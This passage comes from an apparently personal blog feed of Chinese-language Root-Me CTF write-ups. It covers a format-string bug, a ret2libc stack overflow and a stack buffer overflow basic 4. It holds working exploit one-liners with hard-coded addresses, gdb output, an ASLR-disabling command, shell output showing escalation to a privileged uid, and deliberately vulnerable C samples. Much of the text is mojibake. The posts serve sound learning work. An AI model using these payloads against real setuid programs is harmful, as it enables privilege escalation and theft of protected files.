-c â€œprint â€˜%117xâ€™ + â€˜\x0c\xfe\xff\xbfâ€™â€;cat) | ./ch17</p><p>ä½†æ˜¯æŠ¥æ®µé”™è¯¯ï¼Œè¿˜æ²¡æƒ³åˆ°åŸå› ã€‚</p><h3 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h3><p>åŸå› åº”è¯¥æ˜¯gdbå†…å¤–çš„åœ°å€æ˜¯ä¸ä¸€æ ·çš„<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a><br>ä½¿ç”¨è¿™ç¯‡ä¸­çš„findenv.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">    ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨touchï¼Œvimå‘½ä»¤åˆ›å»ºæ–‡ä»¶</p><pre><code>app-systeme-ch17@challenge02:~$ /tmp/findenv SHELLCODE ./ch17SHELLCODE will be at 0xbffffe31app-systeme-ch17@challenge02:~$ (python -c &quot;print &#39;%117x&#39;+&#39;\x31\xfe\xff\xbf&#39;&quot; ;cat ) | ./ch17Username: Bad username: %117x1Ã¾Ã¿Â¿iduid=1117(app-systeme-ch17) gid=1117(app-systeme-ch17) euid=1217(app-systeme-ch17-cracked) groups=1117(app-systeme-ch17),100(users)</code></pre><h3 id="å­¦åˆ°çš„å‘½ä»¤"><a href="#å­¦åˆ°çš„å‘½ä»¤" class="headerlink" title="å­¦åˆ°çš„å‘½ä»¤"></a>å­¦åˆ°çš„å‘½ä»¤</h3><p><code>show env PATH</code></p><p><code>echo $PATH</code></p><p>%x æ‰“å°32ä½</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Format-String-Bug-Basic-3&quot;&gt;&lt;a href=&quot;#ELF-x86-Format-String-Bug-Basic-3&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Format String Bug Basic 3&quot;&gt;&lt;/a&gt;ELF x86 - Format String Bug Basic 3&lt;/h1&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - Stack buffer overflow basic 6</title>
    <link href="http://finsenty54.github.io/2020/12/31/Stack_buffer_overflow_basic_6/"/>
    <id>http://finsenty54.github.io/2020/12/31/Stack_buffer_overflow_basic_6/</id>
    <published>2020-12-31T06:08:34.000Z</published>
    <updated>2020-12-31T06:36:36.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Stack-buffer-overflow-basic-6"><a href="#ELF-x86-Stack-buffer-overflow-basic-6" class="headerlink" title="ELF x86 - Stack buffer overflow basic 6"></a>ELF x86 - Stack buffer overflow basic 6</h1><p><code>return to libc</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">20</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Usage: %s &lt;message&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    <span class="built_in">strcpy</span> (message, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Your message: %s\n&quot;</span>, message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="çŸ¥è¯†å­¦ä¹ "><a href="#çŸ¥è¯†å­¦ä¹ " class="headerlink" title="çŸ¥è¯†å­¦ä¹ "></a>çŸ¥è¯†å­¦ä¹ </h2><h3 id="setuid-amp-setgid"><a href="#setuid-amp-setgid" class="headerlink" title="setuid &amp; setgid"></a>setuid &amp; setgid</h3><p>When the** setuid or setgid <strong>attributes are set on an executable file, then any users able to **execute the file will automatically execute the file with the privileges of the fileâ€™s owner (commonly root)</strong> and/or the fileâ€™s group, depending upon the flags set<br>æ™®é€šç”¨æˆ·æå‡æƒé™è¿è¡Œ<br>The setuid and setgid bits are normally set with the command chmod by setting the high-<strong>order octal digit to 4 for setuid or 2 for setgid</strong>. â€œchmod 6711 fileâ€ will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file,** the process will run with user and group permissions set upon it by its owner**. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.<br><code>chmod +s</code></p><h3 id="é˜²å¾¡-é™æƒ-seteuid"><a href="#é˜²å¾¡-é™æƒ-seteuid" class="headerlink" title="é˜²å¾¡-é™æƒ seteuid()"></a>é˜²å¾¡-é™æƒ seteuid()</h3><p>Normal approach followed by root setuid programs is to drop root privileges before getting input from the user. Thus even when user input is malicious, attacker wont get a root shell.<br>root setuidæ¥æ”¶ç”¨æˆ·è¾“å…¥åï¼Œä¸¢å¼ƒrootæƒé™<br>For** example below vulnerable code **wont allow the attacker to get a root shell.</p><pre><code> seteuid(getuid()); /* Temporarily drop privileges */ </code></pre><h3 id="sticky-bit"><a href="#sticky-bit" class="headerlink" title="sticky bit"></a>sticky bit</h3><p>When a directoryâ€™s sticky bit is set, the filesystem treats the files in such directories in a special way <strong>so only the fileâ€™s owner,</strong> the directoryâ€™s owner, or root user can rename or delete the file. </p><pre><code>ls -l testchmod +t test; ls -l test</code></pre><h3 id="setreuid"><a href="#setreuid" class="headerlink" title="setreuid()"></a>setreuid()</h3><p><code>setreuid(geteuid(), geteuid());</code> è¿™æ˜¯æå‡æƒé™<br>æ¯ä¸ªLinuxè¿›ç¨‹éƒ½æœ‰æœ‰ä¸¤ä¸ªç›¸å…³çš„ç”¨æˆ·IDï¼šå®é™…ç”¨æˆ·IDï¼ˆå³ruidï¼‰å’Œæœ‰æ•ˆç”¨æˆ·IDï¼ˆå³euidï¼‰ï¼Œå…¶ä¸­ruidè¡¨ç¤ºäº†è¯¥è¿›ç¨‹ç”±è°è¿è¡Œï¼Œå³å½“å‰ç³»ç»Ÿç¯å¢ƒç”¨æˆ·æ˜¯è°ï¼Œä¸»è¦å›ç­”who am I?çš„é—®é¢˜ï¼›è€Œeuidåˆ™ç”¨æ¥è§„èŒƒè¿›ç¨‹çš„å®é™…æƒé™æ§åˆ¶ã€‚æ¯”å¦‚passwdæ–‡ä»¶å­˜æ”¾äº†ç”¨æˆ·åå’Œå¯†ç ï¼Œå½“ä¸€ä¸ªæ™®é€šç”¨æˆ·è¿è¡Œpasswdæ—¶ï¼Œå…¶ruidæ˜¯è‡ªå·±ï¼Œè€Œeuidåˆ™ä¸´æ—¶å˜ä¸ºäº†æ–‡ä»¶çš„æ‰€æœ‰è€…rootã€‚<br>setreuidçš„ä½œç”¨åœ¨äºè®¾ç½®ruidå’Œeuid</p><h3 id="geteuid"><a href="#geteuid" class="headerlink" title="geteuid()"></a>geteuid()</h3><p>geteuid()ç”¨æ¥å–å¾—æ‰§è¡Œç›®å‰è¿›ç¨‹æœ‰æ•ˆçš„ç”¨æˆ·è¯†åˆ«ç . æœ‰æ•ˆçš„ç”¨æˆ·è¯†åˆ«ç ç”¨æ¥<strong>å†³å®šè¿›ç¨‹æ‰§è¡Œçš„æƒé™,</strong> å€Ÿç”±æ­¤æ”¹å˜æ­¤å€¼, è¿›ç¨‹å¯ä»¥<strong>è·å¾—é¢å¤–çš„æƒé™</strong>. å€˜è‹¥æ‰§è¡Œæ–‡ä»¶çš„setID ä½å·²è¢«è®¾ç½®, è¯¥æ–‡ä»¶æ‰§è¡Œæ—¶, å…¶è¿›ç¨‹çš„euidå€¼ä¾¿ä¼šè®¾æˆè¯¥æ–‡ä»¶æ‰€æœ‰è€…çš„uid. ä¾‹å¦‚, æ‰§è¡Œæ–‡ä»¶/usr/bin/passwd çš„æƒé™ä¸º-r-sâ€“xâ€“x, å…¶s ä½å³ä¸ºsetID(SUID)ä½, è€Œå½“ä»»ä½•ç”¨æˆ·åœ¨æ‰§è¡Œpasswd æ—¶å…¶æœ‰æ•ˆçš„ç”¨æˆ·è¯†åˆ«ç ä¼šè¢«è®¾æˆpasswd æ‰€æœ‰è€…çš„uid å€¼, <strong>å³root çš„uid å€¼(0)</strong>.</p><pre><code>app-systeme-ch13@challenge02:~$ ls -l ./ch13-r-sr-x--- 1 app-systeme-ch13-cracked app-systeme-ch13 7360 May 19  2019 ./ch13</code></pre><h3 id="å…³é—­ASLR-åŸæ¥å€¼æ˜¯2"><a href="#å…³é—­ASLR-åŸæ¥å€¼æ˜¯2" class="headerlink" title="å…³é—­ASLR åŸæ¥å€¼æ˜¯2"></a>å…³é—­ASLR åŸæ¥å€¼æ˜¯2</h3><p>ä½¿ç”¨<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>å³å¯å…³é—­ASLR</p><hr><h2 id="ret2licå…¥é—¨"><a href="#ret2licå…¥é—¨" class="headerlink" title="ret2licå…¥é—¨"></a>ret2licå…¥é—¨</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf); <span class="comment">/* [3] */</span></span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>r $(python2 -c &quot;print &#39;A&#39;*270&quot;)</code><br>æº¢å‡º 64ä½ä¸‹<br><code>Invalid $PC address: 0x414141414141</code></p><hr><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>é€†å‘</p><pre><code>gdb-peda$ r $(python -c &quot;print &#39;a&#39;*36&quot;)Stopped reason: SIGSEGV0x61616161 in ?? ()</code></pre><p>æŸ¥çœ‹</p><pre><code>gdb-peda$ print system$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e68310 &lt;system&gt;gdb-peda$ print exit$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e5b260 &lt;exit&gt;x/4000s $rsp0xbffffef8:     &quot;SHELL=/bin/bash&quot;gdb-peda$ x/s 0xbffffef8+60xbffffefe:     &quot;/bin/bash&quot;ã€x</code></pre><p>å°†è¿™ä¸‰é¡¹è¿æ¥åœ¨ä¸€èµ·<br><code>r $(python -c &quot;print &#39;a&#39;*32+&#39;\x10\x83\xe6\xb7&#39;+&#39;\x60\xb2\xe5\xb7&#39;+&#39;\xfe\xfe\xff\xbf&#39;&quot;) </code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÆ’Ã¦Â·`Â²Ã¥Â·Ã¾Ã¾Ã¿Â¿</span><br><span class="line">[New process <span class="number">5677</span>]</span><br><span class="line">process <span class="number">5677</span> is executing <span class="keyword">new</span> program: /bin/dash</span><br><span class="line">Error in re-setting breakpoint <span class="number">1</span>: Function <span class="string">&quot;main&quot;</span> <span class="keyword">not</span> defined.</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address </span><br></pre></td></tr></table></figure><p>æŠ¥é”™ä¸æˆåŠŸ</p><p><code>(gdb) info proc map</code><br>æŸ¥çœ‹è™šæ‹Ÿç©ºé—´å¸ƒå±€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Start Addr   End Addr       Size     Offset objfile</span><br><span class="line"> 0x8048000  0x8049000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x8049000  0x804a000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x804a000  0x804b000     0x1000     0x1000 /challenge/app-systeme/ch33/ch33</span><br><span class="line">0xb7e27000 0xb7e28000     0x1000        0x0</span><br><span class="line">0xb7e28000 0xb7fd3000   0x1ab000        0x0 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd3000 0xb7fd5000     0x2000   0x1aa000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd5000 0xb7fd6000     0x1000   0x1ac000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd6000 0xb7fda000     0x4000        0x0</span><br><span class="line">0xb7fda000 0xb7fdd000     0x3000        0x0 [vvar]</span><br><span class="line">0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]</span><br><span class="line">0xb7fde000 0xb7ffe000    0x20000        0x0 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7ffe000 0xb7fff000     0x1000    0x1f000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7fff000 0xb8000000     0x1000    0x20000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xbffdf000 0xc0000000    0x21000        0x0 [stack]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾â€/bin/shâ€åœ¨libcä¸­çš„ä½ç½®</p><pre><code>gdb-peda$ searchmem &quot;/bin/sh&quot; 0xb7e27000 0xb7fd6000Searching for &#39;/bin/sh&#39; in range: 0xb7e27000 - 0xb7fd6000Found 1 results, display max 1 items:libc.so.6 : 0xb7f8ad4c (&quot;/bin/sh&quot;)</code></pre><p>æˆ–è€…<br><code>gdb-peda$ find &quot;/bin/sh&quot;</code></p><p>æˆåŠŸï¼Œä¸­é—´exit()ä¸ç”¨è¿æ¥ä¹Ÿå¯ä»¥<br>for exiting without segmentation fault, itâ€™s necessary to replace the â€˜DDDDâ€™ with a valid address (e.g address to libcâ€™s exit function).<br>éœ€è¦é€€å‡ºæ²¡æœ‰æ®µæŠ¥é”™ï¼Œå°†DDDDç”¨exitæ›¿æ¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch33@challenge02:~$ ./ch33 $(python -c <span class="string">&quot;print &#x27;a&#x27;*32+&#x27;\x10\x83\xe6\xb7&#x27;+&#x27;AAAA&#x27;+&#x27;\x4c\xad\xf8\xb7&#x27;&quot;</span>)</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÆ’Ã¦Â·AAAALÂ­Ã¸Â·</span><br><span class="line">$ id</span><br><span class="line">uid=1233(app-systeme-ch33-cracked) gid=1133(app-systeme-ch33) groups=1133(app-systeme-ch33),100(users)</span><br><span class="line">$ cat .passwd</span><br></pre></td></tr></table></figure><p><code>/bin/sh</code> used to point to<code>/bin/bash</code>on most GNU/Linux systems.</p><hr><p>æŸ¥çœ‹å¸ƒå±€çš„å¦ä¸€ç§æ–¹æ³•<br><code>maintenance info sections ALLOBJ</code><br>Object file: /lib/x86_64-linux-gnu/libc.so.6<br> [0]      0x7ffff7de42e0-&gt;0x7ffff7de4304 at 0x000002e0: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [1]      0x7ffff7de4304-&gt;0x7ffff7de4324 at 0x00000304: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [2]      0x7ffff7de4328-&gt;0x7ffff7de781c at 0x00000328: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [3]      0x7ffff7de7820-&gt;0x7ffff7deb4d4 at 0x00003820: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [4]      0x7ffff7deb4d8-&gt;0x7ffff7df9308 at 0x000074d8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [5]      0x7ffff7df9308-&gt;0x7ffff7dff3c9 at 0x00015308: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Stack-buffer-overflow-basic-6&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-6&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 6&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 6&lt;/h1&gt;&lt;p&gt;&lt;code&gt;return to libc&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; ** argv)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; message[&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;Usage: %s &amp;lt;message&amp;gt;\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setreuid(geteuid(), geteuid());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcpy&lt;/span&gt; (message, argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;Your message: %s\n&amp;quot;&lt;/span&gt;, message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - stack buffer overflow basic 4</title>
    <link href="http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/"/>
    <id>http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</id>
    <published>2020-12-29T13:26:05.000Z</published>
    <updated>2020-12-29T13:54:15.356Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-stack-buffer-overflow-basic-4"><a href="#ELF-x86-stack-buffer-overflow-basic-4" class="headerlink" title="ELF x86 - stack buffer overflow basic 4"></a>ELF x86 - stack buffer overflow basic 4</h1><p>å‚è€ƒ: </p><ol><li><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a></li><li><a href="https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md">https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md</a></li><li><a href="http://showlinkroom.me/2017/12/04/Root-me-App-System02/">http://showlinkroom.me/2017/12/04/Root-me-App-System02/</a></li><li><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution">https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution</a></li></ol><h2 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h2><p><code>struct EnvInfo GetEnv(void)&#123;&#125;</code> ä¸­æœ‰<code>strcpy()</code>å‡½æ•°ï¼Œå­˜åœ¨æº¢å‡ºç‚¹ã€‚</p><pre><code>            +----------------------------+            |      HOME env variable     |     %ebp - 540            +----------------------------+            |    USERNAME env variable   |     %ebp - 412            +----------------------------+            |      SHELL env variable    |     %ebp - 284            +----------------------------+            |      PATH env variable     |     %ebp - 156            +----------------------------+            |           saved ebp        |            +----------------------------+            |        return address      |     %ebp + 4            +----------------------------+            |   rep movsl dest. address  |     %ebp + 8            +----------------------------+  </code></pre><a id="more"></a><p>Since 540 - 128 = 412, 412 - 128 = 284 and 284 - 128 = 156, we get the following stack 